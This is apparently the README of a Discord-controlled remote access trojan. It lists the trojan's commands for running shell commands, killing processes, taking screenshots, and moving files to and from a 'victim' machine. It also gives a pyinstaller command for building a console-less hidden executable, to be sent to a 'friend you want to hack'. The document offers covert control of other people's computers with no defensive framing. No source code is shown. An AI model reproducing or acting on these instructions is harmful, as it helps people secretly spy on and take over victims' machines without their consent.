The Discord R A T

This is a R A T, and it is really powerfull, it allows you to run commands, take screenshots, upload files, and even download files from your victim.
The list of commands:
1. /message [YOUR-MESSAGE]
2. /ipV4
3. /ipV4_public
4. /flashbang
5. /info
6. /run [YOUR-CMD-COMMAND]
7. /kill [PROCESS-PID]
8. /download [PATH-TO-FILE]
9. /screenshot
10. /upload [ATTACH-YOUR-FILE]
How to Use:
1. You can compile this into an exe using pyinstaller, to make it hidded aka no console window use the command: pyinstaller --onefile --noconsole --debug=all bot.py . Then you can send this file to your friend you want to hack/troll and when they open it, your bot will be active and you can run commands in your bot
2. You can send this as it is to your friend, high chance it won't work xD
